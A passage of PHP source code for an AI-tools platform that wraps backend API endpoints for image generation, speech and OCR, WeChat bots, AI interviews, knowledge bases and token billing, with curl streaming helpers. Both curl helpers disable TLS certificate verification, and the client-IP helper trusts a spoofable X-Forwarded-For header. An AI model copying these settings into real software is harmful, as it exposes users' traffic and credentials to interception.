            ->setApiUrl('/api/hidream/image/txt2posterimage')
            ->setRequest($params)
            ->setMethod('POST')
            ->send()
            ->response;
    }

    /**
     * 文生图
     * @param array $params
     * @return array
     */
    public function volctxt2Img(array $params): array
    {
        return app(ToolsService::class)
            ->setApiUrl('/api/hidream/image/volcimage')
            ->setRequest($params)
            ->setMethod('POST')
            ->send()
            ->response;
    }

    /**
     * 文生海报图
     * @param array $params
     * @return array
     */
    public function volctxt2PosterImg(array $params): array
    {

        return app(ToolsService::class)
            ->setApiUrl('/api/hidream/image/volcposterimage')
            ->setRequest($params)
            ->setMethod('POST')
            ->send()
            ->response;
    }
    /**
     * 文生图状态
     * @param array $params
     * @return array
     */
    public function txt2ImgStatus(array $params): array
    {
        $params['image_type'] = 'txt2img';
        return app(ToolsService::class)
            ->setApiUrl('/api/hidream/image/status')
            ->setRequest($params)
            ->setMethod('POST')
            ->send()
            ->response;
    }
    /**
     * 文生图状态
     * @param array $params
     * @return array
     */
    public function txt2PosterImgStatus(array $params): array
    {
        $params['image_type'] = 'txt2img';
        return app(ToolsService::class)
            ->setApiUrl('/api/hidream/image/status')
            ->setRequest($params)
            ->setMethod('POST')
            ->send()
            ->response;
    }

    /**
     * 图生图
     * @param array $params
     * @return array
     */
    public function img2Img(array $params): array
    {

        return app(ToolsService::class)
            ->setApiUrl('/api/hidream/image/img2img')
            ->setRequest($params)
            ->setMethod('POST')
            ->send()
            ->response;
    }

    /**
     * 图生图状态
     * @param array $params
     * @return array
     */
    public function img2ImgStatus(array $params): array
    {
        $params['image_type'] = 'img2img';
        return app(ToolsService::class)
            ->setApiUrl('/api/hidream/image/status')
            ->setRequest($params)
            ->setMethod('POST')
            ->send()
            ->response;
    }

    /**
     * 模板列表
     * @param array $params
     * @return array
     */
    public function templateList(array $params): array
    {

        return app(ToolsService::class)
            ->setApiUrl('/api/hidream/template/lists')
            ->setRequest($params)
            ->setMethod('POST')
            ->send()
            ->response;
    }

    /**
     * 添加模板
     * @param array $params
     * @return array
     */
    public function templateCreate(array $params): array
    {

        return app(ToolsService::class)
            ->setApiUrl('/api/hidream/template/create')
            ->setRequest($params)
            ->setMethod('POST')
            ->send()
            ->response;
    }

    /**
     * 更新模板
     * @param array $params
     * @return array
     */
    public function templateUpdate(array $params): array
    {

        return app(ToolsService::class)
            ->setApiUrl('/api/hidream/template/update')
            ->setRequest($params)
            ->setMethod('POST')
            ->send()
            ->response;
    }


    /**
     * 商品图抠图
     * @param array $params
     * @return array
     */
    public function shopImgCut(array $params): array
    {

        return app(ToolsService::class)
            ->setApiUrl('/api/hidream/image/shopImgCut')
            ->setRequest($params)
            ->setMethod('POST')
            ->send()
            ->response;
    }

    /**
     * 商品图生图
     * @param array $params
     * @return array
     */
    public function shopImg2Img(array $params): array
    {

        return app(ToolsService::class)
            ->setApiUrl('/api/hidream/image/shopImg2img')
            ->setRequest($params)
            ->setMethod('POST')
            ->send()
            ->response;
    }

    /**
     * 商品图生图状态
     * @param array $params
     * @return array
     */
    public function shopImg2ImgStatus(array $params): array
    {

        $params['image_type'] = 'shopImg2img';
        return app(ToolsService::class)
            ->setApiUrl('/api/hidream/image/status')
            ->setRequest($params)
            ->setMethod('POST')
            ->send()
            ->response;
    }


    /**
     * AI试衣
     * @param array $params
     * @return array
     */
    public function vtonCreate(array $params): array
    {

        return app(ToolsService::class)
            ->setApiUrl('/api/hidream/image/vton')
            ->setRequest($params)
            ->setMethod('POST')
            ->send()
            ->response;
    }

    /**
     * AI试衣状态
     * @param array $params
     * @return array
     */
    public function vtonStatus(array $params): array
    {

        $params['image_type'] = 'vton';
        $params['models'] = 'bailian';
        return app(ToolsService::class)
            ->setApiUrl('/api/hidream/image/status')
            ->setRequest($params)
            ->setMethod('POST')
            ->send()
            ->response;
    }

    /**
     * AI消除
     * @param array $params
     * @return array
     */
    public function eraseCreate(array $params): array
    {

        return app(ToolsService::class)
            ->setApiUrl('/api/hidream/image/erase')
            ->setRequest($params)
            ->setMethod('POST')
            ->send()
            ->response;
    }
}


/**
 * ASR
 */
class AsrService
{

    /**
     * 音频转文字
     * @param array $params
     * @return array
     */
    public function text(array $params): array
    {

        return app(ToolsService::class)
            ->setApiUrl('/api/asr/audio/text')
            ->setRequestAndNotifyUrl($params, '/api/audio/notify', [])
            ->setMethod('POST')
            ->send()
            ->response;
    }

    /**
     * 音频转文字状态
     * @param array $params
     * @return array
     */
    public function status(array $params): array
    {
        return app(ToolsService::class)
            ->setApiUrl('/api/asr/audio/status')
            ->setRequest($params)
            ->setMethod('POST')
            ->send()
            ->response;
    }
}


/**
 * OCR
 */
class OcrService
{

    /**
     * 图片转文字
     * @param array $params
     * @return array
     */
    public function image2text(array $params): array
    {

        return app(ToolsService::class)
            ->setApiUrl('/api/ocr/image/text')
            ->setRequest($params)
            ->setMethod('POST')
            ->send()
            ->response;
    }
}

/**
 * AI 陪练
 */
class LlService
{

    /**
     * 聊天
     * @return array
     */
    public function chat(array $params = []): array
    {

        return app(ToolsService::class)
            ->setApiUrl('/api/v2/ll/chat')
            ->setRequest($params)
            ->setMethod('POST')
            ->send()
            ->response;
    }

    /**
     * 转语音
     * @return array
     */
    public function stt(array $params = []): array
    {

        $params['action'] = 'stt';

        return app(ToolsService::class)
            ->setApiUrl('/api/v2/ll/chat')
            ->setRequest($params)
            ->setMethod('POST')
            ->send()
            ->response;
    }
}
/**
 * AI 微信
 */
class WechatService
{

    /**
     * 聊天
     * @return array
     */
    public function chat(array $params = []): array
    {

        $params['action'] = 'chat';
        return app(ToolsService::class)
            ->setApiUrl('/api/chat/completions')
            ->setRequest($params)
            ->setMethod('POST')
            ->send()
            ->response;
    }

    /**
     * 推送消息
     * @return array
     */
    public function push(array $params = []): array
    {

        $params['action'] = 'push';
        return app(ToolsService::class)
            ->setApiUrl('/api/wechat/chat')
            ->setRequest($params)
            ->setMethod('POST')
            ->send()
            ->response;
    }

    /**
     * 获取在线状态
     * @return array
     */
    public function online(array $params = []): array
    {

        $params['action'] = 'online';
        return app(ToolsService::class)
            ->setApiUrl('/api/wechat/chat')
            ->setRequest($params)
            ->setMethod('POST')
            ->send()
            ->response;
    }

    /**
     * 接受好友请求
     * @return array
     */
    public function accept(array $params = []): array
    {

        $params['action'] = 'accept';
        return app(ToolsService::class)
            ->setApiUrl('/api/wechat/chat')
            ->setRequest($params)
            ->setMethod('POST')
            ->send()
            ->response;
    }

    /**
     * 发圈
     * @return array
     */
    public function circle(array $params = []): array
    {

        $params['action'] = 'circle';
        return app(ToolsService::class)
            ->setApiUrl('/api/wechat/chat')
            ->setRequest($params)
            ->setMethod('POST')
            ->send()
            ->response;
    }

    public function createGroup(array $params = []): array
    {
        return app(ToolsService::class)
            ->setApiUrl('/api/wechat/create_group')
            ->setRequest($params)
            ->setMethod('POST')
            ->send()
            ->response;
    }
}



/**
 * AI 面试
 */
class InterviewService
{


    // 替换为：
    const URL         = IMAI_INTERVIEW_URL;
    const WORKFLOW_ID = IMAI_INTERVIEW_WORKFLOW_ID;
    const TOKEN       = IMAI_INTERVIEW_TOKEN;
    /**
     * 聊天
     * @return array
     */
    public function chat(array $params = []): array
    {
        return app(ToolsService::class)
            ->setApiUrl('/api/v2/interview/chat')
            ->setRequest($params)
            ->setMethod('POST')
            ->send()
            ->response;
    }

    public function cv(array $params = []): array
    {

        return app(ToolsService::class)
            ->setApiUrl('/api/v2/interview/chat')
            ->setRequest($params)
            ->setMethod('POST')
            ->setHeaders(['Content-Type' => 'multipart/form-data'])
            ->send()
            ->response;
    }

    public function qwen(array $params = []): array
    {

        return app(ToolsService::class)
            ->setApiUrl('/api/interview/qwen')
            ->setRequest($params)
            ->setMethod('POST')
            ->send()
            ->response;
    }

    public function stt(array $params = []): array
    {

        $params['action'] = 'stt';

        return app(ToolsService::class)
            ->setApiUrl('/api/v2/interview/chat')
            ->setRequest($params)
            ->setMethod('POST')
            ->send()
            ->response;
    }

    public function tts(array $params = []): array
    {

        $params['action'] = 'tts';

        return app(ToolsService::class)
            ->setApiUrl('/api/v2/interview/chat')
            ->setRequest($params)
            ->setMethod('POST')
            ->send()
            ->response;
    }


    /**
     * 简历解析
     * @return array
     */
    public function jx($params = [])
    {
        return app(ToolsService::class)
            ->setApiUrl('/api/v2/interview/chat')
            ->setRequest($params)
            ->setMethod('POST')
            ->setHeaders(['Content-Type' => 'application/json'])
            ->send()
            ->response;
    }
}

/**
 * 向量知识库
 */
class VectorKnowledgeService
{
    public function text2vector(array $params = []): array
    {
        return app(ToolsService::class)
            ->setApiUrl('/api/embeddings/text2vector')
            ->setRequest($params)
            ->setMethod('POST')
            ->send()
            ->response;
    }

    public function create_vector(array $params = []): array
    {
        return app(ToolsService::class)
            ->setApiUrl('/api/knowledge/create_vector')
            ->setRequest($params)
            ->setMethod('POST')
            ->send()
            ->response;
    }
}

/**
 * 知识库
 */
class KnowledgeService
{


    /**
     * Undocumented function
     *
     * @param array $params
     * @return array
     */
    public function selectCategory(array $params = []): array
    {

        $params['method'] = 'category_list';

        return app(ToolsService::class)
            ->setApiUrl('/api/knowledge/knowledge')
            ->setRequest($params)
            ->setMethod('POST')
            ->send()
            ->response;
    }

    /**
     * 创建分类
     * @return array
     */
    public function createCategory(array $params = []): array
    {

        $params['method'] = 'category_create';
        return app(ToolsService::class)
            ->setApiUrl('/api/knowledge/knowledge')
            ->setRequest($params)
            ->setMethod('POST')
            ->send()
            ->response;
    }


    public function deleteCategory(array $params = []): array
    {

        $params['method'] = 'category_delete';
        return app(ToolsService::class)
            ->setApiUrl('/api/knowledge/knowledge')
            ->setRequest($params)
            ->setMethod('POST')
            ->send()
            ->response;
    }

    public function listFile(array $params = []): array
    {

        $params['method'] = 'file_list';
        return app(ToolsService::class)
            ->setApiUrl('/api/knowledge/knowledge')
            ->setRequest($params)
            ->setMethod('POST')
            ->send()
            ->response;
    }

    public function createFile(array $params = []): array
    {

        $params['method'] = 'file_create';
        return app(ToolsService::class)
            ->setApiUrl('/api/knowledge/knowledge')
            ->setRequest($params)
            ->setMethod('POST')
            ->send()
            ->response;
    }


    public function infoFile(array $params = []): array
    {

        $params['method'] = 'file_info';
        return app(ToolsService::class)
            ->setApiUrl('/api/knowledge/knowledge')
            ->setRequest($params)
            ->setMethod('POST')
            ->send()
            ->response;
    }


    public function deleteFile(array $params = []): array
    {

        $params['method'] = 'file_delete';
        return app(ToolsService::class)
            ->setApiUrl('/api/knowledge/knowledge')
            ->setRequest($params)
            ->setMethod('POST')
            ->send()
            ->response;
    }


    public function updateTagFile(array $params = []): array
    {

        $params['method'] = 'file_up_tags';
        return app(ToolsService::class)
            ->setApiUrl('/api/knowledge/knowledge')
            ->setRequest($params)
            ->setMethod('POST')
            ->send()
            ->response;
    }

    public function createIndex(array $params = []): array
    {

        $params['method'] = 'index_create';

        return app(ToolsService::class)
            ->setApiUrl('/api/knowledge/create')
            ->setRequest($params)
            ->setMethod('POST')
            ->send()
            ->response;
    }

    public function jobStatusIndex(array $params = []): array
    {

        $params['method'] = 'job_status';
        return app(ToolsService::class)
            ->setApiUrl('/api/knowledge/knowledge')
            ->setRequest($params)
            ->setMethod('POST')
            ->send()
            ->response;
    }

    public function subJobIndex(array $params = []): array
    {

        $params['method'] = 'submit_index_job';
        return app(ToolsService::class)
            ->setApiUrl('/api/knowledge/knowledge')
            ->setRequest($params)
            ->setMethod('POST')
            ->send()
            ->response;
    }

    public function addDocJobIndex(array $params = []): array
    {

        $params['method'] = 'add_documents_job';
        return app(ToolsService::class)
            ->setApiUrl('/api/knowledge/knowledge')
            ->setRequest($params)
            ->setMethod('POST')
            ->send()
            ->response;
    }


    public function retrieveIndex(array $params = []): array
    {

        $params['method'] = 'retrieve';

        return app(ToolsService::class)
            ->setApiUrl('/api/knowledge/knowledge')
            ->setRequest($params)
            ->setMethod('POST')
            ->send()
            ->response;
    }

    public function listIndexFile(array $params = []): array
    {

        $params['method'] = 'list_index_file';

        return app(ToolsService::class)
            ->setApiUrl('/api/knowledge/knowledge')
            ->setRequest($params)
            ->setMethod('POST')
            ->send()
            ->response;
    }

    public function chunkIndex(array $params = []): array
    {

        $params['method'] = 'chunk_list';
        return app(ToolsService::class)
            ->setApiUrl('/api/knowledge/knowledge')
            ->setRequest($params)
            ->setMethod('POST')
            ->send()
            ->response;
    }

    public function listIndex(array $params = []): array
    {
        $params['method'] = 'list_index';

        return app(ToolsService::class)
            ->setApiUrl('/api/knowledge/knowledge')
            ->setRequest($params)
            ->setMethod('POST')
            ->send()
            ->response;
    }

    public function deleteIndex(array $params = []): array
    {

        $params['method'] = 'index_delete';

        return app(ToolsService::class)
            ->setApiUrl('/api/knowledge/knowledge')
            ->setRequest($params)
            ->setMethod('POST')
            ->send()
            ->response;
    }

    public function deleteDocIndex(array $params = []): array
    {

        $params['method'] = 'index_delete_docment';
        return app(ToolsService::class)
            ->setApiUrl('/api/knowledge/knowledge')
            ->setRequest($params)
            ->setMethod('POST')
            ->send()
            ->response;
    }

    public function retrievePrompt(array $params = []): array
    {

        $params['method'] = 'prompt_retrieve';
        //print_r($params);die;
        return app(ToolsService::class)
            ->setApiUrl('/api/knowledge/knowledge')
            ->setRequest($params)
            ->setMethod('POST')
            ->send()
            ->response;
    }

    public function promptChat(array $params, callable $callback = null): bool|array
    {

        $params['method'] = 'prompt_chat';
        $request = app(ToolsService::class)
            ->setApiUrl('/api/chat/completions')
            ->setMethod('POST')
            ->setRequest($params);

        if (isset($params['stream']) && !$params['stream']) {

            return $request->send()->response;
        }

        $request->streamSend($callback);
        return true;
    }

    public function openaiChat(array $params, callable $callback = null): bool|array
    {

        $request = app(ToolsService::class)
            ->setApiUrl('/api/chat/completions')
            ->setMethod('POST')
            ->setRequest($params);

        if (isset($params['stream']) && !$params['stream']) {

            return $request->send()->response;
        }

        $request->streamSend($callback);
        return true;
    }

    public function geminiChat(array $params, callable $callback = null): bool|array
    {
        $request = app(ToolsService::class)
            ->setApiUrl('/api/chat/completions')
            ->setMethod('POST')
            ->setRequest($params);

        if (isset($params['stream']) && !$params['stream']) {

            return $request->send()->response;
        }

        $request->streamSend($callback);
        return true;
    }
}




/**
 * 数据中台
 */
class DataCenterService
{

    /**
     * 获取数据中台 - 算力计费列表
     * @return array
     */
    public function tokensLists(array $params = []): array
    {

        return app(ToolsService::class)
            ->setApiUrl('/api/data/tokens/lists')
            ->setRequest($params)
            ->setMethod('POST')
            ->send()
            ->response;
    }

    /**
     * 获取数据中台 - 对话模型列表
     * @return array
     */
    public function chatModelsLists(array $params = []): array
    {
        return app(ToolsService::class)
            ->setApiUrl('/api/data/chat/models/lists')
            ->setRequest($params)
            ->setMethod('POST')
            ->send()
            ->response;
    }

    /**
     * 获取数据中台 - 生图/生视频模型列表
     * @return array
     */
    public function mediaModelsLists(array $params = []): array
    {
        return app(ToolsService::class)
            ->setApiUrl('/api/data/media/models/lists')
            ->setRequest($params)
            ->setMethod('POST')
            ->send()
            ->response;
    }

    /**
     * 中台设备CDK列表
     */
    public function deviceAuthCodeLists(array $params = []): array
    {
        return app(ToolsService::class)
            ->setApiUrl('/api/deviceAuthCode/lists')
            ->setRequest($params)
            ->setMethod('POST')
            ->send()
            ->response;
    }

    /**
     * 中台设备CDK激活
     */
    public function deviceAuthCodeActivate(array $params): array
    {
        return app(ToolsService::class)
            ->setApiUrl('/api/deviceAuthCode/activate')
            ->setRequest($params)
            ->setMethod('POST')
            ->sendWithoutThrow()
            ->response;
    }

    /**
     * 中台设备CDK购买绑定站长端用户
     */
    public function deviceAuthCodeAssign(array $params): array
    {
        return app(ToolsService::class)
            ->setApiUrl('/api/deviceAuthCode/assign')
            ->setRequest($params)
            ->setMethod('POST')
            ->send()
            ->response;
    }

    /**
     * 设备管理系统历史设备CDK导入中台并推送站长端
     */
    public function deviceAuthCodeLegacySync(array $params = []): array
    {
        return app(ToolsService::class)
            ->setApiUrl('/api/deviceAuthCode/legacy-sync')
            ->setRequest($params)
            ->setMethod('POST')
            ->sendWithoutThrow()
            ->response;
    }

    /**
     * 中台设备授权状态查询
     */
    public function deviceAuthCodeDeviceAuth(array $params): array
    {
        return app(ToolsService::class)
            ->setApiUrl('/api/deviceAuthCode/device-auth')
            ->setRequest($params)
            ->setMethod('POST')
            ->sendWithoutThrow()
            ->response;
    }

    /**
     * 中台设备CDK列表
     */
    public function deviceCdkLists(array $params = []): array
    {
        return app(ToolsService::class)
            ->setApiUrl('/api/deviceCdk/lists')
            ->setRequest($params)
            ->setMethod('POST')
            ->send()
            ->response;
    }

    /**
     * 中台同步外部设备CDK
     */
    public function deviceCdkSync(array $params = []): array
    {
        return app(ToolsService::class)
            ->setApiUrl('/api/deviceCdk/sync')
            ->setRequest($params)
            ->setMethod('POST')
            ->sendWithoutThrow()
            ->response;
    }

    /**
     * 中台设备CDK使用/兑换
     */
    public function deviceCdkUse(array $params): array
    {
        return app(ToolsService::class)
            ->setApiUrl('/api/deviceCdk/use')
            ->setRequest($params)
            ->setMethod('POST')
            ->sendWithoutThrow()
            ->response;
    }

    /**
     * 中台设备CDK兑换
     */
    public function deviceCdkRedeem(array $params): array
    {
        return app(ToolsService::class)
            ->setApiUrl('/api/deviceCdk/redeem')
            ->setRequest($params)
            ->setMethod('POST')
            ->sendWithoutThrow()
            ->response;
    }

    /**
     * 获取数据中台 - 算力信息
     * @return array
     */
    public function tokensInfo(array $params = []): array
    {

        return app(ToolsService::class)
            ->setApiUrl('/api/data/tokens/info')
            ->setRequest($params)
            ->setMethod('POST')
            ->send()
            ->response;
    }

    /**
     * 充值算力
     * @param array $params
     * @return array
     */
    public function tokensCdk(array $params): array
    {

        return app(ToolsService::class)
            ->setApiUrl('/api/data/tokens/cdk')
            ->setRequest($params)
            ->setMethod('POST')
            ->send()
            ->response;
    }

    /**
     * 获取数据中台 - 密钥信息
     * @return array
     */
    public function tokensKey(array $params = []): array
    {
        return app(ToolsService::class)
            ->setApiUrl('/api/data/tokens/key')
            ->setRequest($params)
            ->setMethod('POST')
            ->send(false)
            ->response;
    }
}

/**
 * 获取客户端IP地址
 */
function ToolsGetRealServerIp(): string
{

    if (isset($_SERVER['HTTP_X_FORWARDED_FOR'])) {
        $arr = explode(',', $_SERVER['HTTP_X_FORWARDED_FOR']);
        $pos = array_search('unknown', $arr);
        if (false !== $pos) {
            unset($arr[$pos]);
        }
        $ip = trim($arr[0]);
    } elseif (isset($_SERVER['HTTP_CLIENT_IP'])) {
        $ip = $_SERVER['HTTP_CLIENT_IP'];
    } elseif (isset($_SERVER['REMOTE_ADDR'])) {
        $ip = $_SERVER['REMOTE_ADDR'];
    }
    return $ip;
}

/**
 * 获取当前站点信息
 * @return array
 */
function ToolsGetCurrentSiteInfo(): array
{
    $domain = '';
    $port = '';

    if (isset($_SERVER['HTTP_HOST'])) {
        $domain = $_SERVER['HTTP_HOST'];
    } elseif (isset($_SERVER['SERVER_NAME'])) {
        $domain = $_SERVER['SERVER_NAME'];
    }

    if (isset($_SERVER['SERVER_PORT'])) {
        $port = (int) $_SERVER['SERVER_PORT'];
    }

    // 去掉域名中的端口部分
    if (str_contains($domain, ':')) {

        $domain = explode(':', $domain)[0];
    }

    return [$domain, $port];
}


/**
 * CURL 流请求
 * @param string $url 请求地址
 * @param array $data 请求参数
 * @param array $headers 请求头
 * @return void
 */
function ToolsSteamCurlRequest(string $url, array $data = [], array $headers = [], callable $callback = null): void
{

    $ch = curl_init();

    // 设置基本选项
    curl_setopt($ch, CURLOPT_URL, $url);
    curl_setopt($ch, CURLOPT_HTTP_VERSION, CURL_HTTP_VERSION_1_1);
    curl_setopt($ch, CURLOPT_CONNECTTIMEOUT, 0); // 设置较长的连接超时，单位为秒
    curl_setopt($ch, CURLOPT_TIMEOUT, 0); // 设置为 0 表示不限制超时时间
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($ch, CURLOPT_POST, true);
    curl_setopt($ch, CURLOPT_POSTFIELDS, json_encode($data));
    curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
    curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, false);

    // 设置默认请求头
    $defaultHeaders = [
        'Content-Type' => 'application/json',
    ];

    // 合并默认请求头和注入的请求头
    $headers = array_merge($defaultHeaders, $headers);

    $request = $data;

    curl_setopt($ch, CURLOPT_HTTPHEADER, ToolsFormatHeaders($headers));

    $response = [];

    curl_setopt($ch, CURLOPT_WRITEFUNCTION, function ($ch, $data) use ($request, $callback, &$response) {

        if (is_callable($callback)) {

            return $callback($data);
        } else {

            //执行解析
            return ToolsStreamCallback($data, $request, $response);
        }
    });

    curl_exec($ch);

    curl_close($ch);

    unset($response);
}

function ToolsStreamCollectRequest(string $url, array $data = [], array $headers = []): array
{
    $chunks = [];
    $raw = '';
    $callback = static function (string $eventData) use (&$chunks, &$raw): int {
        $raw .= $eventData;
        foreach (preg_split("/\r\n|\n|\r/", $eventData) ?: [] as $line) {
            $line = trim($line);
            if ($line === '' || !str_starts_with($line, 'data:')) {
                continue;
            }
            $payload = trim(substr($line, 5));
            if ($payload === '' || $payload === '[DONE]') {
                continue;
            }
            $decoded = json_decode($payload, true);
            if (is_array($decoded)) {
                $chunks[] = $decoded;
            }
        }
        return strlen($eventData);
    };

    ToolsSteamCurlRequest($url, $data, $headers, $callback);
    return ToolsBuildCollectedStreamResponse($chunks, $raw);
}

function ToolsBuildCollectedStreamResponse(array $chunks, string $raw = ''): array
{
    if (empty($chunks)) {
        $decoded = json_decode($raw, true);
        if (is_array($decoded)) {
            $errorMessage = ToolsExtractStreamErrorMessage($decoded);
            if ($errorMessage !== '') {
                return [
                    'success' => false,
                    'message' => $errorMessage,
                    'raw_response' => $decoded,
                ];
            }
            return $decoded + ['success' => (($decoded['success'] ?? true) !== false)];
        }
        return [
            'success' => false,
            'message' => '模型流式响应为空',
            'raw_response' => strlen($raw) > 2000 ? '[omitted_large_payload]' : $raw,
        ];
    }

    $content = '';
    $role = 'assistant';
    $finishReason = null;
    $usage = [];
    $id = '';
    $created = time();
    $model = '';

    foreach ($chunks as $chunk) {
        $errorMessage = ToolsExtractStreamErrorMessage($chunk);
        if ($errorMessage !== '') {
            return [
                'success' => false,
                'message' => $errorMessage,
                'raw_response' => $chunk,
            ];
        }
        if (isset($chunk['code']) && !in_array((int)$chunk['code'], [0, 10000], true)) {
            return [
                'success' => false,
                'message' => (string)($chunk['message'] ?? '模型流式响应异常'),
                'raw_response' => $chunk,
            ];
        }

        $id = $id !== '' ? $id : (string)($chunk['id'] ?? '');
        $created = (int)($chunk['created'] ?? $created);
        $model = $model !== '' ? $model : (string)($chunk['model'] ?? '');
        if (isset($chunk['usage']) && is_array($chunk['usage'])) {
            $usage = $chunk['usage'];
        }

        $choice = $chunk['choices'][0] ?? [];
        if (!is_array($choice)) {
            continue;
        }

        $delta = $choice['delta'] ?? [];
        if (is_array($delta)) {
            if (isset($delta['role'])) {
                $role = (string)$delta['role'];
            }
            if (isset($delta['content'])) {
                $content .= is_array($delta['content'])
                    ? json_encode($delta['content'], JSON_UNESCAPED_UNICODE | JSON_UNESCAPED_SLASHES)
                    : (string)$delta['content'];
            }
        }

        if (isset($choice['message']) && is_array($choice['message'])) {
            $message = $choice['message'];
            if (isset($message['role'])) {
                $role = (string)$message['role'];
            }
            if (isset($message['content'])) {
                $content .= is_array($message['content'])
                    ? json_encode($message['content'], JSON_UNESCAPED_UNICODE | JSON_UNESCAPED_SLASHES)
                    : (string)$message['content'];
            }
        }

        if (array_key_exists('finish_reason', $choice)) {
            $finishReason = $choice['finish_reason'];
        }
    }

    return [
        'success' => true,
        'id' => $id,
        'created' => $created,
        'model' => $model,
        'choices' => [
            [
                'index' => 0,
                'message' => [
                    'role' => $role,
                    'content' => $content,
                ],
                'finish_reason' => $finishReason,
            ],
        ],
        'usage' => $usage,
    ];
}


/**
 * CURL 请求
 * @param string $url 请求地址
 * @param array $data 请求参数
 * @param string $method 请求类型
 * @param array $headers 请求头
 * @return array
 */
function ToolsCurlPostRequest(
    string $url,
    array $data = [],
    string $method = 'post',
    array $headers = [],
    int $connectTimeout = 0,
    int $requestTimeout = 0
): array {

    $ch = curl_init();
    $methodUpper = strtoupper($method ?: 'POST');

    // GET 带参走 query；无参无 body（中台 GET 状态查询按空 body 验签）
    if ($methodUpper === 'GET' && $data !== []) {
        $qs = http_build_query($data);
        $url .= (str_contains($url, '?') ? '&' : '?') . $qs;
        $data = [];
    }

    // 设置基本选项
    curl_setopt($ch, CURLOPT_URL, $url);
    curl_setopt($ch, CURLOPT_HTTP_VERSION, CURL_HTTP_VERSION_1_1);
    curl_setopt($ch, CURLOPT_CONNECTTIMEOUT, max(0, $connectTimeout));
    curl_setopt($ch, CURLOPT_TIMEOUT, max(0, $requestTimeout));
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
    curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, false);
    curl_setopt($ch, CURLOPT_CUSTOMREQUEST, $methodUpper);

    // 规范化请求头，统一转换为标准格式（首字母大写）
    $normalizedHeaders = [];
    foreach ($headers as $key => $value) {
        $normalizedKey = str_replace(' ', '-', ucwords(str_replace('-', ' ', strtolower($key))));
        $normalizedHeaders[$normalizedKey] = $value;
    }

    // 设置默认请求头
    $defaultHeaders = [
        'Content-Type' => 'application/json',
    ];

    // 合并请求头，确保用户设置的头信息优先
    $finalHeaders = array_merge($defaultHeaders, $normalizedHeaders);

    if ($methodUpper !== 'GET' && $methodUpper !== 'HEAD') {
        // 根据 Content-Type 处理请求数据
        $contentType = $finalHeaders['Content-Type'] ?? 'application/json';
        if (stripos($contentType, 'multipart/form-data') !== false) {
            // 交给 curl 自动带 boundary，手动写 multipart/form-data 会导致文件上传失败
            unset($finalHeaders['Content-Type']);
            curl_setopt($ch, CURLOPT_HTTPHEADER, ToolsFormatHeaders($finalHeaders));
            curl_setopt($ch, CURLOPT_POSTFIELDS, $data);
        } elseif (stripos($contentType, 'application/x-www-form-urlencoded') !== false) {
            curl_setopt($ch, CURLOPT_HTTPHEADER, ToolsFormatHeaders($finalHeaders));
            curl_setopt($ch, CURLOPT_POSTFIELDS, $data);
        } else {
            curl_setopt($ch, CURLOPT_HTTPHEADER, ToolsFormatHeaders($finalHeaders));
            curl_setopt($ch, CURLOPT_POSTFIELDS, $data === [] ? '{}' : json_encode($data));
        }
    } else {
        curl_setopt($ch, CURLOPT_HTTPHEADER, ToolsFormatHeaders($finalHeaders));
    }

    // Log::channel('human')->write('参数'.json_encode($data,JSON_UNESCAPED_UNICODE | JSON_UNESCAPED_SLASHES).'/n 头部'.json_encode($contentType,JSON_UNESCAPED_UNICODE | JSON_UNESCAPED_SLASHES));

    // 发送请求
    $response = curl_exec($ch);
    $curlErrno = curl_errno($ch);
    if ($curlErrno) {
        $message = $curlErrno === CURLE_OPERATION_TIMEDOUT
            ? '请求超时，请稍后重试'
            : '您提交的信息似乎不太对哦';
        curl_close($ch);
        return ['code' => 10001, 'message' => $message, 'data' => ['curl_errno' => $curlErrno]];
    }
    curl_close($ch);
    $responseJson = json_decode($response, true);

    if (json_last_error() === JSON_ERROR_NONE) {
        if ($responseJson === null) {
            return ['code' => 10001, 'message' => '您提交的信息似乎不太对哦', 'data' => []];
        }
        return $responseJson;
    }
    // 打印错误信息
    return ['code' => 10001, 'message' => '您提交的信息似乎不太对哦', 'data' => []];
}


/**
 * 从 OpenAI/新中台或旧 Tools 错误体中提取可读错误文案。
 * 优先 error.message，其次顶层 msg/message。
 * 含「预扣费额度失败」「用户额度不足」等内部计费文案时，统一模糊为通用服务异常提示，避免向终端用户展示站长额度信息。
 */
function ToolsExtractStreamErrorMessage(array $data): string
{
    $message = '';
    if (isset($data['error'])) {
        if (is_array($data['error']) && isset($data['error']['message']) && $data['error']['message'] !== '') {
            $message = (string)$data['error']['message'];
        } elseif (is_string($data['error']) && $data['error'] !== '') {
            $message = $data['error'];
        }
    }
    if ($message === '' && isset($data['msg']) && $data['msg'] !== '') {
        $message = (string)$data['msg'];
    }
    if ($message === '' && isset($data['message']) && $data['message'] !== '') {
        $message = (string)$data['message'];
    }
    return ToolsSanitizeStreamErrorMessage($message);
}

/**
 * 对面向用户的流式错误文案做脱敏/替换。
 */
function ToolsSanitizeStreamErrorMessage(string $message): string
{
    if ($message === '') {
        return '';
    }
    if (
        str_contains($message, '预扣费额度失败')
        || str_contains($message, '用户剩余额度')
        || str_contains($message, '需要预扣费额度')
        || str_contains($message, '用户额度不足')
    ) {
        return '当前服务异常，请稍后再试或联系管理员。';
    }
    return $message;
}

/**
 * 向站长端前端推送错误文案（loading + finished，与 403 分支一致）。
 */
function ToolsStreamEmitErrorContent(array $request, string $errorMessage): void
{
    $errorMessage = ToolsSanitizeStreamErrorMessage($errorMessage);
    $payload = [
        'created' => time(),
        'content' => $errorMessage,
        'file_info' => $request['file_info'] ?? [],
        'reasoning_content' => null,
        'usage' => [],
        'task_id' => $request['task_id'] ?? null,
    ];
    echo "data:" . json_encode(array_merge(['object' => 'loading'], $payload), JSON_UNESCAPED_UNICODE | JSON_UNESCAPED_SLASHES) . "\n\n";
    ob_flush();
    flush();
    echo "data:" . json_encode(array_merge(['object' => 'finished'], $payload), JSON_UNESCAPED_UNICODE | JSON_UNESCAPED_SLASHES) . "\n\n";
    ob_flush();
    flush();
}

/**
 * 流返回
 * @param $eventData
 * @param $request
 * @return int
 */
function ToolsStreamCallback($eventData, $request, &$response): int
{
    // 设置不超时
    set_time_limit(0);
    ini_set('max_execution_time', 0);

    $request['task_id'] = $request['task_id'] ?? generate_unique_task_id();

    // 初始化响应数据结构
    if (!isset($response['reply']))
        $response['reply'] = '';
    if (!isset($response['reasoning_content']))
